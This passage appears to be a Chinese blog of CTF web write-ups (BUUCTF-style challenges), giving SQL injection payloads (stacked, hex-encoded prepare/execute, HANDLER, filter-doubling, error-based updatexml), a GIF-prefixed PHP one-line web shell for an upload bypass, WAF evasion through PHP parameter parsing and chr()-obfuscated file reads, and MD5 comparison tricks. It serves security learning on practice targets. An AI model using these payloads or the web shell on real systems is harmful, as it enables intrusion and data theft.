<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-symbol">`1919810931114514`</span><br></code></pre></td></tr></table></figure>

<p>进行16进制编码</p>
<p>再通过构造payload得</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;SeT@a=0x<span class="hljs-number">7365</span>6c<span class="hljs-number">65637420</span>2a<span class="hljs-number">206672</span>6f6d<span class="hljs-number">20603139313938</span><span class="hljs-number">31303933313131</span><span class="hljs-number">3435313460</span>;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure>

<p>进而得到flag</p>
<pre><code class="hljs">prepare…from…是预处理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。
</code></pre>
<p>这里由于我将 1919810931114514 表的名字改为 words ，所以我应该用</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">select * <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span><br></code></pre></td></tr></table></figure>

<p>构造payload</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span>&#x27;;SeT@a=0x<span class="hljs-number">7365</span>6C<span class="hljs-number">65637420</span>2A<span class="hljs-number">206672</span>6F6D<span class="hljs-number">2077</span>6F<span class="hljs-number">726473</span>;prepare execsql from @a;execute execsql;#<br></code></pre></td></tr></table></figure>

<p>这里我们既查了1，又有16进制的payload，所以出现两个flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030921262.png" srcset="/img/loading.gif" lazyload alt="image-20250403092147057"></p>
<p>第三个，</p>
<p>使用MySQL特有的<code>HANDLER</code>命令来直接访问表数据，绕过常规的SELECT查询。</p>
<p><strong>HANDLER命令详解</strong></p>
<p><code>HANDLER</code>命令提供了一种比SELECT更直接的访问表数据的方式：</p>
<ul>
<li>不需要完整的SQL解析</li>
<li>性能更高</li>
<li>但功能有限，主要用于顺序扫描表</li>
</ul>
<p>常见HANDLER操作：</p>
<ol>
<li><code>HANDLER tbl_name OPEN</code> - 打开表</li>
<li><code>HANDLER tbl_name READ FIRST</code> - 读取第一行</li>
<li><code>HANDLER tbl_name READ NEXT</code> - 读取下一行</li>
<li><code>HANDLER tbl_name CLOSE</code> - 关闭表</li>
</ol>
<p>下面是举例payload1（这是<code>[GYCTF2020]Blacklist</code>的payload）</p>
<pre><code class="hljs">1&#39;; handler `FlagHere` open as `a`; handler `a` read next;#
</code></pre>
<p>payload1解释如下</p>
<p>第一个操作：handler  `FlagHere` open as `a`</p>
<ul>
<li><code>HANDLER</code>是MySQL特有的低级表访问接口</li>
<li>语法：<code>HANDLER table_name OPEN [AS alias]</code></li>
<li>这里打开名为<code>FlagHere</code>的表，并赋予别名<code>a</code></li>
<li>反引号(&#96;&#96;)用于包裹表名，防止特殊字符引起问题</li>
</ul>
<p>第二个操作：handler `a` read next</p>
<ul>
<li>使用之前打开的handler别名<code>a</code></li>
<li><code>READ NEXT</code>从表中读取下一行数据</li>
<li>这会返回表中的第一行内容(因为这是第一次调用)</li>
</ul>
<p>还有payload2，都大同小异了</p>
<pre><code class="hljs">1&#39;;HANDLER FlagHere OPEN; HANDLER FlagHere READ FIRST; HANDLER FlagHere CLOSE;#
</code></pre>
<p>payload2解释如下</p>
<p>第一个操作：<code>HANDLER FlagHere OPEN</code></p>
<ul>
<li>打开名为<code>FlagHere</code>的表</li>
<li>与前一条不同，这里没有使用反引号包裹表名，也没有设置别名</li>
</ul>
<p>第二个操作：<code>HANDLER FlagHere READ FIRST</code></p>
<ul>
<li>读取<code>FlagHere</code>表的第一行数据</li>
<li>前一条使用的是<code>READ NEXT</code>，这里使用<code>READ FIRST</code>更明确地表示要读取第一行</li>
</ul>
<p>第三个操作：<code>HANDLER FlagHere CLOSE</code></p>
<ul>
<li>显式关闭之前打开的表</li>
<li>这是与前一条不同的新增操作，确保handler被正确关闭</li>
</ul>
<p>这道题的payload：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></code></pre></td></tr></table></figure>

<p>因为改表名了，所以改为</p>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-number">1</span>&#x27;; handler `words` <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> `a`; handler `a` read next;#<br></code></pre></td></tr></table></figure>

<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>传个一句话木马试试</p>
<p>显示不是图片</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022151079.png" srcset="/img/loading.gif" lazyload alt="image-20250402215143008"></p>
<p>MIME绕过</p>
<p>显示php后缀不行</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022153399.png" srcset="/img/loading.gif" lazyload alt="image-20250402215257575"></p>
<p>改成php5试试，也不行</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154077.png" srcset="/img/loading.gif" lazyload alt="image-20250402215409018"></p>
<p>但phtml行，<strong>[ACTF2020 新生赛]Upload</strong>这一题也是用phtml上传</p>
<p>但是显示不能带<code>&lt;?</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154277.png" srcset="/img/loading.gif" lazyload alt="image-20250402215451218"></p>
<p>这里我们专门制作一个图片马，文件内容为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure>

<p>成功上传</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022203755.png" srcset="/img/loading.gif" lazyload alt="image-20250402220343696"></p>
<p>蚁剑连接，出flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022206825.png" srcset="/img/loading.gif" lazyload alt="image-20250402220626769"></p>
<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><p>输入如下</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081742786.png" srcset="/img/loading.gif" lazyload alt="image-20250408174237619"></p>
<p>注入点在password</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081743341.png" srcset="/img/loading.gif" lazyload alt="image-20250408174323252"></p>
<p><code>&#39; union select 1,2,3#</code></p>
<p>但是回显只有<code>1,2,3#</code>，应该是有过滤</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081744223.png" srcset="/img/loading.gif" lazyload alt="image-20250408174430971"></p>
<p><code>1&#39; UNunionION SELselectECT 1,2,3#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081746204.png" srcset="/img/loading.gif" lazyload alt="image-20250408174617004"></p>
<p>这里有一个点，flag并不在当前数据库里（不要固化思维），所以我们要查所有库</p>
<p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(schema_name) FRfromOM infoorrmation_schema.schemata#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081749775.png" srcset="/img/loading.gif" lazyload alt="image-20250408174929545"></p>
<p>这里当前库是geek，flag不在geek库里，在ctf库里</p>
<p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(table_name) FRfromOM infoorrmation_schema.tables WHwhereERE table_schema = &#39;ctf&#39;#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081754969.png" srcset="/img/loading.gif" lazyload alt="image-20250408175405736"></p>
<p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(column_name) FRfromOM infoorrmation_schema.columns WHwhereERE table_name = &#39;Flag&#39;#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081755427.png" srcset="/img/loading.gif" lazyload alt="image-20250408175529169"></p>
<p>注意字段在ctf库的Flag表里，直接查会有如下结果</p>
<p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(flag) FRfromOM Flag#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081759078.png" srcset="/img/loading.gif" lazyload alt="image-20250408175953022"></p>
<p>语句如下</p>
<p><code>&#39; UNunionION SEselectLECT 1,2,group_concat(flag) FRfromOM ctf.Flag#</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081800050.png" srcset="/img/loading.gif" lazyload alt="image-20250408180018845"></p>
<p>这题其实并不难</p>
<p>关键点在于黑盒过滤以及flag不在本库的注入手段</p>
<h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>一开始是一个计算器</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082245019.png" srcset="/img/loading.gif" lazyload alt="image-20250408224526861"></p>
<p>右键查看源代码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082246259.png" srcset="/img/loading.gif" lazyload alt="image-20250408224610906"></p>
<p>让我们看一下其中的关键代码，这里JavaScript代码的作用是：</p>
<p>先向服务器发送要计算的数据， 用jQuery 选择器选中id为 “calc” 的表单元素，提取其中id为 “content”的HTML标签元素的值（即<code>(&quot;#content&quot;).val()</code>相当于<code> document.getElementById(&quot;content&quot;).value</code>），并将其编码后放到<code>calc.php?num=</code>后面，比如我们在计算器上输入1+1，实际就是发送<code>num=1%2b1</code>到calc.php；然后处理服务器的响应并显示，当服务器返回成功响应时返回运算结果，当请求失败时返回“这啥?算不来!“。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    $(<span class="hljs-string">&#x27;#calc&#x27;</span>).<span class="hljs-title function_">submit</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>:<span class="hljs-string">&quot;calc.php?num=&quot;</span>+<span class="hljs-built_in">encodeURIComponent</span>($(<span class="hljs-string">&quot;#content&quot;</span>).<span class="hljs-title function_">val</span>()),</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>:<span class="hljs-string">&#x27;GET&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">success</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;</span><br><span class="language-javascript">                $(<span class="hljs-string">&quot;#result&quot;</span>).<span class="hljs-title function_">html</span>(<span class="hljs-string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="hljs-subst">$&#123;data&#125;</span></span></span><br><span class="hljs-string"><span class="language-javascript">            &lt;/div&gt;`</span>);</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">error</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>然后这里我们看看calc.php</p>
<p>无非是一个黑名单</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>然后我们尝试在calc.php输入<code>?num=phpinfo()</code>,试图执行<code>echo phpinfo();</code></p>
<p>可以看到这里报错，我们没权限直接向calc.php传递数据</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082311468.png" srcset="/img/loading.gif" lazyload alt="image-20250408231136211"></p>
<p>实测传递<code>?num=1</code>和<code>?num=1%2b1</code>可行（这里传参本质上和在计算器那里输入是一样的）</p>
<p>可以发现，这里num变量传递字母之类的都是不行的，</p>
<p>我们回想到</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span><br></code></pre></td></tr></table></figure>

<p>所以这里应该还有WAF，WAF之后才是calc.php，然后我们还要绕过calc.php的黑名单</p>
<p>原来waf我们是看不见的，我一直以为题里的源码，就是waf了。并且，waf并不是说，题目是用php写的，那么waf就一定是用php写的（也正因如此，这题的waf才会无法识别“ num”和“num”其实是一样的）。</p>
<p>这里怎么过WAF呢？有两种方法</p>
<p>第一种，PHP的字符串解析特性</p>
<blockquote>
<p>PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p>
<p>1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。</p>
<p>假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫<code>“ num”</code>，而不是<code>“num”</code>。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p>
</blockquote>
<p>所以我们传参<code>? num=phpinfo()</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330602.png" srcset="/img/loading.gif" lazyload alt="image-20250408233037288"></p>
<p>然后我们尝试命令执行<code>? num=;system(&#39;ls&#39;)</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330838.png" srcset="/img/loading.gif" lazyload alt="image-20250408233010770"></p>
<p>看来WAF挺强的（其实disable_fuction也有system）</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082339180.png" srcset="/img/loading.gif" lazyload alt="image-20250408233941096"></p>
<p>所以这里我们<strong>scandir() 函数</strong>进行目录读取，<strong>file_get_contents() 函数</strong>进行flag读取。</p>
<p><strong>chr() 函数</strong>：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。</p>
<p><strong>file_get_contents() 函数</strong>：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
<p>var_dump() 将变量以字符串形式输出，替代print和echo.</p>
<p>scandir() 扫描某个目录并将结果以array形式返回，配和vardump 可以替代system(‘ls;’)</p>
<p>由于“&#x2F;”被过滤了，所以我们可以使用chr(47)来进行表示<code>? num=1;var_dump(scandir(chr(47)))</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082333991.png" srcset="/img/loading.gif" lazyload alt="image-20250408233346711"></p>
<p>构造：<code>/flagg</code>——&gt;<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br>payload：<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082335148.png" srcset="/img/loading.gif" lazyload alt="image-20250408233517873"></p>
<p>空格也可换为+，如<code>?+num=var_dump(scandir(chr(47)))</code>，php解析时，如果变量前面有空格，会去掉前面的空格再解析，PHP解析时 ,<code>&#39;num&#39;</code>&#x3D;<code>&#39; num&#39;</code>&#x3D;<code>&#39;+num&#39;</code>三者认为是同一个变量，但是waf只认<code>’num’</code>而<code>’ num’</code>和<code>’+num’</code>都不在范围内，这样就能绕过waf。</p>
<p>chr(47)也可以换为hex2bin(dechex(47))，如<code>?+num=var_dump(scandir(hex2bin(dechex(47))))</code>，dechex()函数把十进制数转换为十六进制数。hex2bin()函数把十六进制值的字符串转换为 ASCII字符。</p>
<p>file_get_contents()可换为file()，如<code>? num=1;var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>，readfile()也可以<code>? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>，甚至可以用代码混淆技术，将readfile()换为<code>? num=1;base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p>
<p>第二种，HTTP请求走私</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504090005083.png" srcset="/img/loading.gif" lazyload alt="image-20250409000537738"></p>
<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>这道题比较考验信息搜集和信息处理能力</p>
<p>入手点在菜单处</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045621.png" srcset="/img/loading.gif" lazyload alt="image-20250409104519333"></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045167.png" srcset="/img/loading.gif" lazyload alt="image-20250409104557819"></p>
<p>然后这里给了提示，虽然这里并不知道是什么意思</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091046076.png" srcset="/img/loading.gif" lazyload alt="image-20250409104652888"></p>
<p>查看源代码</p>
<p>发现要用post传递money和password</p>
<p>这里password要弱等于404，且不能是数字，这里用404a</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091047662.png" srcset="/img/loading.gif" lazyload alt="image-20250409104754377"></p>
<p>money等于多少呢？</p>
<p>实际上已经给了提示，100000000</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091050747.png" srcset="/img/loading.gif" lazyload alt="image-20250409105007557"></p>
<p>所以我们抓包传参</p>
<p>这里根据提示，似乎是将cookie中的user改为1</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091052133.png" srcset="/img/loading.gif" lazyload alt="image-20250409105247941"></p>
<p>又显示数字太长</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091053575.png" srcset="/img/loading.gif" lazyload alt="image-20250409105334324"></p>
<p>我们改成科学计数</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091054674.png" srcset="/img/loading.gif" lazyload alt="image-20250409105448470"></p>
<h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p>一开始并没有在第一个网页中找到思路</p>
<p>只是提交查询后弹出了一个参数</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091551756.png" srcset="/img/loading.gif" lazyload alt="image-20250409155121654"></p>
<p>没想到提示要抓包重放看</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091102922.png" srcset="/img/loading.gif" lazyload alt="image-20250409110254755"></p>
<blockquote>
<p>Hint: select * from ‘admin’ where password&#x3D;md5($pass,true)</p>
</blockquote>
<p><strong>md5(string,raw)</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需。规定要计算的字符串。</td>
</tr>
<tr>
<td>raw</td>
<td>可选。规定十六进制或二进制输出格式： TRUE - 原始 16 字符二进制格式；FALSE - 默认。32 字符十六进制数</td>
</tr>
</tbody></table>
<p>这里采用万能密码的方式去绕过，即构造or来绕过password</p>
<p>但这里输入要经过md5($pass,true)，怎么构造万能密码呢？</p>
<p>可以发现<code>md5(&#39;ffifdyop&#39;,true)</code>的结果为<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code></p>
<p>所以原sql查询语句则变为<code>select * from user where username =&#39;admin&#39; and password =&#39;&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c&#39;</code>，即可绕过</p>
<p>类似的字符串还有:<code>md5(&#39;129581926211651571912466741651878684928&#39;,true)</code>&#x3D;<code>\x06\xdaT0D\x9f\x8fo#\xdf\xc1&#39;or&#39;8</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091546105.png" srcset="/img/loading.gif" lazyload alt="image-20250409154644992"></p>
<p>所以我们只需要输入ffifdyop就可以绕过</p>
<p>然后进入第二个网页</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091556862.png" srcset="/img/loading.gif" lazyload alt="image-20250409155615608"></p>
<p>右键查看源代码</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091552337.png" srcset="/img/loading.gif" lazyload alt="image-20250409155211977"></p>
<p>这里使用了&#x3D;&#x3D;弱比较</p>
<p>&#x3D;&#x3D; 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较</p>
<p>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。</p>
<p>这里完全可以去寻找明文不同但MD5值为”0exxxxx”</p>
<p>这里提供两个QNKCDZO和s878926199a，s878926199a和s155964671a</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=s878926199a&amp;b=s155964671a<br>?<span class="hljs-attribute">a</span>=QNKCDZO&amp;b=s878926199a<br></code></pre></td></tr></table></figure>

<p>然后进入第三个网页</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param1&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125; <br></code></pre></td></tr></table></figure>

<p>这里用php数组绕过，由于哈希函数无法处理php数组，在遇到数组时返回false，我们就可以利用false&#x3D;&#x3D;false成立使条件成立。<br> <code>param1[]=1&amp;param2[]=2</code></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>又是黑盒</p>
<p>经测试，一些and、union、select、空格等常见的SQL语句被过滤了</p>
<p>这里用报错注入</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101523649.png" srcset="/img/loading.gif" lazyload alt="image-20250410152353242"></p>
<p>用户名和密码其实都是注入点</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database()),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,database())))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101529058.png" srcset="/img/loading.gif" lazyload alt="image-20250410152906745"></p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;or(<span class="hljs-name">updatexml</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">table_name</span>))from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(<span class="hljs-name">database</span>()))),<span class="hljs-number">1</span>))#<br>&#x27;or(<span class="hljs-name">extractvalue</span>(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span>(<span class="hljs-name">group_concat</span>(<span class="hljs-name">table_name</span>))from(<span class="hljs-name">information_schema</span>.tables)where(<span class="hljs-name">table_schema</span>)like(<span class="hljs-name">database</span>())))))#<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101534419.png" srcset="/img/loading.gif" lazyload alt="image-20250410153450136"></p>
